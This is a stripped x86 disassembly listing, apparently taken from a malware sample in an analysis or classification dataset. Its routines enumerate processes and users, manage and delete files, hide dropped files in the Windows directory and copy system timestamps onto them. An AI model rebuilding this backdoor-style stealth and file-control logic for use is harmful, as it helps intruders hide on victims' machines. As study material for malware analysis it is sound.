add esp 0x20
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x444 ]
push eax
call [ GetUserNameA@IAT ]
lea eax [ ebp - 0x444 ]
push eax
push esi
call sub_404c33
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x644 ]
push 0x200
push eax
push [ ebp - 0x14 ]
push esi
call [ ebp - 0x10 ]
lea eax [ ebp - 0x644 ]
push eax
call sub_40373c
pop ecx
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x644 ]
push rw-data
push eax
call strcpy
add esp 0x10
push esi
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x444 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x644 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call strcat
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x344 ]
push eax
lea eax [ ebp + ebx - 0x2744 ]
push eax
call strcpy
lea eax [ ebp - 0x344 ]
push eax
call strlen
lea esi [ ebx + eax + 0x1 ]
mov eax [ ebp - 0x13c ]
mov [ ebp + esi - 0x2744 ] eax
add esi 0x4
lea eax [ ebp - 0x444 ]
push eax
lea eax [ ebp + esi - 0x2744 ]
push eax
call strcpy
lea eax [ ebp - 0x444 ]
push eax
call strlen
lea ebx [ esi + eax + 0x1 ]
mov eax [ ebp - 0x130 ]
add esp 0x30
mov [ ebp + ebx - 0x2744 ] eax
lea eax [ ebp - 0x144 ]
push eax
add ebx 0x4
push [ ebp - 0x8 ]
call Process32Next
test eax eax
jne r-xdata
lea eax [ ebp - 0x644 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call strcpy
pop ecx
pop ecx
push [ ebp - 0x13c ]
push 0x0
push edi
call [ OpenProcess@IAT ]
mov esi eax
push esi
call [ GetPriorityClass@IAT ]
push esi
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x2
jne r-xdata
sub_403af8
push esi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push 0x1
mov esi eax
push [ esp + 0xc ]
call sub_4035ff
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
push 0x1
push eax
call esi
pop esi
retn
sub_403b4d
push esi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push [ esp + 0x8 ]
mov esi eax
push 0x0
push 0x1
call [ OpenProcess@IAT ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push 0x1
push eax
call esi
pop esi
retn
sub_403bc1
push ebp
mov ebp esp
sub esp 0x400
push esi
lea eax [ ebp - 0x400 ]
push [ rw-data ]
push eax
call strcpy
lea eax [ ebp - 0x400 ]
push eax
call strlen
add esp 0xc
mov esi eax
mov [ rw-data ] 0x4f
call sub_4040e4
pop esi
leave
retn
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcpy
mov eax [ rw-data ]
add eax esi
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcat
mov eax [ rw-data ]
add eax esi
push eax
call strlen
add esp 0x14
lea esi [ esi + eax + 0x1 ]
lea eax [ ebp - 0x200 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax + esi ] 0x30
jne r-xdata
lea eax [ ebp - 0x200 ]
push 0x4c
push eax
call sub_404109
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x200 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
inc esi
cmp esi [ rw-data ]
jge r-xdata
sub_403c7c
mov eax [ rw-data ]
push esi
push eax
mov esi eax
call strlen
mov ecx [ rw-data ]
lea eax [ eax + ecx + 0x1 ]
push eax
push esi
call [ rename@IAT ]
add esp 0xc
neg eax
sbb al al
and al 0xf6
add al 0x4f
mov [ rw-data ] al
call sub_4040e4
pop esi
retn
sub_403cb3
push ebp
mov ebp esp
push ecx
push ebx
push [ rw-data ]
call strlen
mov ecx [ rw-data ]
push ecx
mov bl [ eax + ecx + 0x1 ]
call strlen
mov ecx [ rw-data ]
push ecx
mov al [ eax + ecx + 0x2 ]
mov [ ebp - 0x1 ] al
call strlen
mov ecx [ rw-data ]
add esp 0xc
mov al [ eax + ecx + 0x3 ]
push ecx
mov [ ebp - 0x2 ] al
call [ GetFileAttributesA@IAT ]
cmp bl 0x31
pop ebx
jne r-xdata
and al 0xfe
or al 0x1
jmp r-xdata
and al 0xfd
or al 0x2
jmp r-xdata
cmp [ ebp - 0x1 ] 0x31
jne r-xdata
and al 0xfb
or al 0x4
jmp r-xdata
cmp [ ebp - 0x2 ] 0x31
jne r-xdata
push eax
push [ rw-data ]
call [ SetFileAttributesA@IAT ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_4040e4
leave
retn
sub_403d62
xor eax eax
push eax
push 0x2
push 0x2
push eax
push eax
push 0x40000000
push [ rw-data ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov [ rw-data ] 0x45
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] 0x4f
jmp r-xdata
jmp sub_4040e4
sub_403d9d
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
push edi
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push [ rw-data ]
push eax
call memcpy
mov esi [ strrchr@IAT ]
push 0x5c
push [ rw-data ]
call esi
push eax
call sub_403fe8
lea eax [ ebp - 0x214 ]
push 0x5c
push eax
call esi
add esp 0x20
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call strcat
push 0x7d00
mov [ ebp - 0x14 ] 0x42
call [ malloc@IAT ]
mov edi eax
add esp 0xc
test edi edi
je r-xdata
and [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x214 ]
push eax
call sub_403f7c
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
push edi
call [ free@IAT ]
pop ecx
test esi esi
jne r-xdata
lea eax [ esi + esi * 4 ]
push 0x5
shl eax 0x6
add eax 0x5
mov [ ebp - 0x13 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_4021a5
pop ecx
lea eax [ ebp - 0x214 ]
pop ecx
push edi
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
jne r-xdata
push 0x1
pop esi
push edi
call sub_404035
test eax eax
pop ecx
je r-xdata
lea eax [ edi + 0x2c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x8 ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_402a8f
push ebx
push edi
call sub_4020f9
push edi
call [ free@IAT ]
add esp 0x24
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea ebx [ esi - 0x1 ]
test ebx ebx
jle r-xdata
lea eax [ ebp - 0xc ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_402a8f
push ebx
push edi
call sub_4020f9
add esp 0x18
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
push edi
push [ ebp - 0x4 ]
call sub_403f30
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
push edi
call [ free@IAT ]
pop ecx
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
add [ ebp - 0x8 ] eax
lea esi [ eax + eax * 4 ]
lea eax [ ebp - 0xc ]
shl esi 0x6
push eax
push edi
push esi
push edi
call sub_402a8f
push esi
push edi
call sub_4020f9
add esp 0x18
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
jl r-xdata
sub_403f30
push ebx
push esi
mov esi [ FindNextFileA@IAT ]
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
push edi
push [ esp + 0x14 ]
mov eax ebx
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
call sub_404035
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp ebx 0x64
jge r-xdata
inc ebx
add edi 0x140
push edi
push [ esp + 0x14 ]
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_403f7c
push ebp
mov ebp esp
sub esp 0x140
push esi
lea eax [ ebp - 0x140 ]
push edi
push eax
push [ ebp + 0x8 ]
xor edi edi
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
lea eax [ ebp - 0x140 ]
push eax
call sub_404035
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x140 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push esi
call [ FindClose@IAT ]
jmp r-xdata
sub_403fe8
and [ rw-data ] 0x0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
push edi
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
and [ esi ] 0x0
test esi esi
jne r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
mov [ eax * 4 + rw-data ] edi
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop edi
sub_404035
push ecx
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
test [ edi ] 0x10
jne r-xdata
push 0x1
pop eax
jmp r-xdata
add edi 0x2c
push 0x2e
push edi
call [ strrchr@IAT ]
and [ esp + 0x20 ] 0x0
cmp [ rw-data ] 0x0
pop ecx
mov [ esp + 0x14 ] eax
pop ecx
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
xor eax eax
mov ebx [ lstrcmpiA@IAT ]
mov esi rw-data
inc [ esp + 0x18 ]
add esi 0x4
mov eax [ esp + 0x18 ]
cmp eax [ rw-data ]
jl r-xdata
push rw-data
push [ esi ]
call ebx
test eax eax
je r-xdata
push [ esi ]
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
push rw-data
push [ esi ]
mov eax [ esi ]
inc eax
inc eax
push eax
call strlen
mov ebp eax
pop ecx
test ebp ebp
je r-xdata
push edi
call strlen
pop ecx
sub eax ebp
mov ecx [ esi ]
inc ecx
inc ecx
add eax edi
push ecx
push eax
jmp r-xdata
call ebx
test eax eax
je r-xdata
sub_4040e4
push ebp
mov ebp esp
push ecx
push ecx
mov al [ rw-data ]
push 0x6
mov [ ebp - 0x3 ] al
pop eax
mov [ ebp - 0x7 ] eax
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x52
push eax
call sub_4021a5
pop ecx
pop ecx
leave
retn
sub_404109
push ebp
mov ebp esp
sub esp 0x844
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ sprintf@IAT ]
lea eax [ ebp - 0x844 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x844 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x4c
jne r-xdata
mov edi [ WaitForSingleObject@IAT ]
mov ebx 0x102
push 0x1
pop eax
push [ ebp + 0x8 ]
call [ RemoveDirectoryA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
cmp [ ebp - 0x118 ] 0x2e
je r-xdata
lea eax [ ebp - 0x144 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x444 ]
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x444 ]
test [ ebp - 0x144 ] 0x10
pop ecx
push eax
push [ ebp + 0x8 ]
push rw-data
je r-xdata
lea eax [ ebp - 0x344 ]
push eax
call esi
add esp 0x10
cmp [ ebp + 0xc ] 0x4c
je r-xdata
lea eax [ ebp - 0x644 ]
push eax
call esi
add esp 0x10
cmp [ ebp + 0xc ] 0x4e
jl r-xdata
lea eax [ ebp - 0x344 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x344 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x4d
jle r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x644 ]
push eax
call sub_404109
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ ebp + 0xc ] 0x4f
jg r-xdata
cmp [ ebp + 0xc ] 0x4f
jle r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x644 ]
push 0x46
push eax
call sub_4045fc
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x344 ]
push 0x44
push eax
call sub_4045fc
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ ebp + 0xc ] 0x59
jne r-xdata
push 0xea60
push [ rw-data ]
call edi
cmp eax ebx
je r-xdata
push 0xea60
push [ rw-data ]
call edi
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x144 ]
push eax
call sub_404035
test eax eax
pop ecx
je r-xdata
cmp [ ebp + 0xc ] 0x4f
jne r-xdata
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call sub_404882
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x344 ]
push eax
push 0x0
call sub_404644
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp - 0x12c ]
lea eax [ ebp - 0x344 ]
push [ ebp - 0x130 ]
push eax
call sub_40490c
add esp 0xc
test eax eax
je r-xdata
push 0xea60
push [ rw-data ]
call edi
cmp eax ebx
je r-xdata
cmp [ ebp + 0xc ] 0x4f
jne r-xdata
sub_40434c
push ebp
mov ebp esp
sub esp 0x200
mov [ rw-data ] 0x4f
call sub_4040e4
push [ rw-data ]
call strlen
pop ecx
mov ecx [ rw-data ]
add eax ecx
cmp [ eax - 0x2 ] 0x3a
jne r-xdata
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x200 ]
pop ecx
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push eax
call [ GetFileAttributesA@IAT ]
or al 0x2
push eax
lea eax [ ebp - 0x200 ]
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x200 ]
push eax
push [ rw-data ]
call sub_4043e8
pop ecx
pop ecx
cmp [ eax - 0x1 ] 0x5c
je r-xdata
leave
retn
sub_4043e8
push ebp
mov ebp esp
sub esp 0xe54
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ sprintf@IAT ]
lea eax [ ebp - 0xa54 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x154 ]
push eax
lea eax [ ebp - 0xa54 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
pop eax
mov edi rw-data
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
cmp [ ebp - 0x128 ] 0x2e
je r-xdata
lea eax [ ebp - 0x154 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x128 ]
push eax
lea eax [ ebp - 0x254 ]
push eax
call strcpy
test [ ebp - 0x154 ] 0x10
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0xa ]
push [ rw-data ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
lea eax [ ebp - 0x354 ]
push rw-data
push eax
call esi
mov eax [ rw-data ]
add esp 0x1c
inc [ rw-data ]
cmp eax 0x1869f
jle r-xdata
push [ rw-data ]
lea eax [ ebp - 0x454 ]
push rw-data
push eax
call esi
mov eax [ rw-data ]
add esp 0xc
inc [ rw-data ]
cmp eax 0x1869f
jle r-xdata
lea eax [ ebp - 0x254 ]
push 0x2e
push eax
call [ strrchr@IAT ]
mov ebx eax
lea eax [ ebp - 0x254 ]
push eax
lea eax [ ebp - 0xe54 ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
add esp 0x18
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
lea eax [ ebp - 0x254 ]
push eax
lea eax [ ebp - 0xc54 ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
lea eax [ ebp - 0x454 ]
push eax
lea eax [ ebp - 0x654 ]
push [ ebp + 0xc ]
push rw-data
push eax
call esi
add esp 0x20
lea eax [ ebp - 0x654 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x654 ]
push eax
lea eax [ ebp - 0xc54 ]
push eax
call sub_4043e8
pop ecx
test eax eax
pop ecx
je r-xdata
and [ rw-data ] 0x0
inc ebx
lea eax [ ebp - 0x354 ]
push ebx
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x854 ]
push rw-data
push eax
call esi
add esp 0x14
lea eax [ ebp - 0x354 ]
push eax
lea eax [ ebp - 0x854 ]
push [ ebp + 0xc ]
push edi
push eax
call esi
add esp 0x10
jmp r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
lea eax [ ebp - 0x854 ]
push 0x0
push eax
lea eax [ ebp - 0xe54 ]
push eax
call [ CopyFileA@IAT ]
jmp r-xdata
sub_4045fc
push ebp
mov ebp esp
sub esp 0x400
push esi
push [ ebp + 0x8 ]
call strlen
push [ ebp + 0x8 ]
mov esi eax
mov al [ ebp + 0xc ]
add esi 0x6
mov [ ebp - 0x400 ] al
lea eax [ ebp - 0x3fb ]
push eax
mov [ ebp - 0x3ff ] esi
call strcpy
lea eax [ ebp - 0x400 ]
push esi
push eax
call sub_4021a5
add esp 0x14
pop esi
leave
retn
sub_404644
push ebp
mov ebp esp
mov eax 0x2008
call sub_405de0
mov eax [ rw-data ]
push ebx
push esi
push edi
push 0x1
cmp eax 0x53
pop ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x2008 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ ebp - 0x2008 ] al
jmp r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
push 0x5
pop ecx
sub ecx [ ebp + 0x8 ]
push esi
add eax ecx
mov [ ebp - 0x2007 ] eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x2008 ]
push 0x5
push eax
call sub_4021a5
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp - 0x2008 ] 0x59
jne r-xdata
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call [ fopen@IAT ]
push edi
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
push eax
call [ fseek@IAT ]
add esp 0x14
cmp [ rw-data ] edi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x55
call sub_4040e4
jmp r-xdata
push 0x6
pop eax
mov [ ebp - 0x2007 ] eax
push eax
lea eax [ ebp - 0x2008 ]
push eax
call sub_4021a5
pop ecx
mov eax ebx
pop ecx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov esi 0x2000
pop edi
pop esi
pop ebx
leave
retn
cmp ebx esi
jne r-xdata
cmp [ rw-data ] 0x41
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push [ ebp - 0x8 ]
call [ fclose@IAT ]
mov eax [ ebp - 0x4 ]
pop ecx
push [ ebp - 0x8 ]
call [ fclose@IAT ]
pop ecx
push edi
push [ ebp + 0xc ]
call [ SetFileAttributesA@IAT ]
push [ ebp + 0xc ]
call [ DeleteFileA@IAT ]
push 0x1
pop eax
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x2008 ]
push esi
push 0x1
push eax
call [ fread@IAT ]
mov ebx eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2008 ]
push eax
lea eax [ ebp - 0x2008 ]
push esi
push eax
call sub_402a8f
lea eax [ ebp - 0x2008 ]
push ebx
push eax
call sub_4020f9
add esp 0x28
test eax eax
je r-xdata
sub_4047db
push 0x46
push [ rw-data ]
call sub_4045fc
pop ecx
pop ecx
push 0xea60
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
retn
push [ esp + 0x4 ]
push [ rw-data ]
call sub_404109
pop ecx
mov [ rw-data ] 0x47
pop ecx
jmp sub_4040e4
sub_404820
push ebx
push esi
push edi
mov esi rw-data
push 0xff
push esi
call [ GetWindowsDirectoryA@IAT ]
push rw-data
push esi
call strcat
mov edi [ DeleteFileA@IAT ]
pop ecx
pop ecx
push esi
call edi
push 0x5c
push [ rw-data ]
call [ strrchr@IAT ]
mov ebx eax
push ebx
call sub_403fe8
and [ ebx ] 0x0
push 0x59
push [ rw-data ]
call sub_404109
push esi
push 0x0
call sub_404644
add esp 0x1c
push esi
call edi
pop edi
pop esi
pop ebx
retn
sub_404882
push ebx
push rw-data
push rw-data
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
pop ebx
retn
push esi
push edi
push ebx
push [ esp + 0x14 ]
call strlen
mov esi [ fwrite@IAT ]
pop ecx
inc eax
push eax
push 0x1
push [ esp + 0x1c ]
call esi
mov edi [ esp + 0x24 ]
push ebx
push 0x8
push 0x1
lea eax [ edi + 0x14 ]
push eax
call esi
push ebx
push 0x4
add edi 0x20
push 0x1
push edi
call esi
push ebx
call [ fclose@IAT ]
add esp 0x34
pop edi
pop esi
sub_40490c
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x2e
push [ ebp + 0x8 ]
call [ strrchr@IAT ]
mov edi [ lstrcmpiA@IAT ]
pop ecx
pop ecx
mov ebx eax
mov esi rw-data
xor eax eax
test ebx ebx
je r-xdata
push rw-data
push esi
lea eax [ esi + 0x2 ]
push eax
lea eax [ ebx + 0x1 ]
push eax
jmp r-xdata
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
add esi 0x10
cmp esi rw-data
jl r-xdata
call edi
test eax eax
je r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
cmp edi 0x7d0
jb r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp edi 0xf4240
ja r-xdata
push rw-data
push [ ebp + 0x8 ]
call [ strstr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
add [ ebp - 0x8 ] 0xd8a14000
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0xc ]
push eax
adc [ ebp - 0x4 ] 0xfffff5c8
call [ CompareFileTime@IAT ]
xor ecx ecx
test eax eax
setge cl
mov eax ecx
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4049ff
push ebp
mov ebp esp
sub esp 0x108
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push rw-data
push esi
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
add eax 0x4
push eax
call strlen
mov edi eax
pop ecx
cmp edi 0x114
mov [ ebp - 0x8 ] edi
jae r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
push eax
call [ fclose@IAT ]
pop ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov esi rw-data
add eax 0x4
push eax
push esi
call strcpy
cmp [ rw-data ] 0x56
pop ecx
pop ecx
jne r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_4040e4
push esi
call sub_404b7c
cmp [ rw-data ] 0x56
pop ecx
jne r-xdata
push ebx
push esi
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x108 ]
push esi
push eax
call strcat
lea eax [ ebp - 0x108 ]
push eax
push esi
call strcpy
add esp 0x18
push esi
call sub_405509
pop ecx
push rw-data
push rw-data
jmp r-xdata
mov [ rw-data ] 0x45
call sub_4040e4
jmp r-xdata
mov eax [ rw-data ]
lea edi [ eax + edi + 0x5 ]
mov eax [ rw-data ]
sub eax [ ebp - 0x8 ]
sub eax 0x5
jmp r-xdata
push esi
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
push ecx
push edi
push eax
push edi
call sub_402a8f
push ebx
push [ ebp - 0x4 ]
push 0x1
push edi
call [ fwrite@IAT ]
push ebx
call [ fclose@IAT ]
add esp 0x24
cmp [ rw-data ] 0x0
je r-xdata
sub_404b7c
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
push edi
lea eax [ ebp - 0x40c ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
xor edi edi
mov esi [ CreateFileA@IAT ]
push edi
push 0x2000000
push 0x3
push edi
push 0x5
lea eax [ ebp - 0x40c ]
push 0x80000000
push eax
call esi
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
push 0x80
push 0x3
push edi
push edi
push 0x40000000
push [ ebp + 0x8 ]
call esi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push edi
lea eax [ ebp - 0xc ]
push edi
push eax
push [ ebp - 0x4 ]
call [ GetFileTime@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
push ebx
call [ SetFileTime@IAT ]
push [ ebp - 0x4 ]
mov esi [ CloseHandle@IAT ]
call esi
push ebx
call esi
push [ ebp + 0x8 ]
call [ GetFileAttributesA@IAT ]
or al 0x2
push eax
push [ ebp + 0x8 ]
call [ SetFileAttributesA@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
jmp r-xdata
sub_404c33
push ebp
mov ebp esp
sub esp 0x4c0
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x100
push eax
push 0x20008
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xc8
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4c0 ]
push 0x3e8
push eax
push 0x1
push [ ebp + 0x8 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push [ ebp - 0x4c0 ]
push 0x0
call [ LookupAccountSidA@IAT ]
neg eax
sbb eax eax
neg eax
leave
retn
sub_404caf
push ebp
mov ebp esp
mov eax 0x4244
call sub_405de0
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ ebp - 0x4 ] eax
call esi
push edi
mov [ ebp - 0x1c ] eax
call [ FreeLibrary@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0x2
or [ ebp - 0x10 ] 0xffffffff
pop edi
mov [ ebp - 0x3c ] ebx
push rw-data
mov [ ebp - 0x40 ] edi
push [ rw-data ]
mov [ ebp - 0x38 ] 0x3
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x14 ] 0x4000
mov [ ebp - 0x8 ] 0x5
mov [ ebp - 0x4244 ] 0x47
call [ strstr@IAT ]
pop ecx
mov esi eax
pop ecx
cmp esi ebx
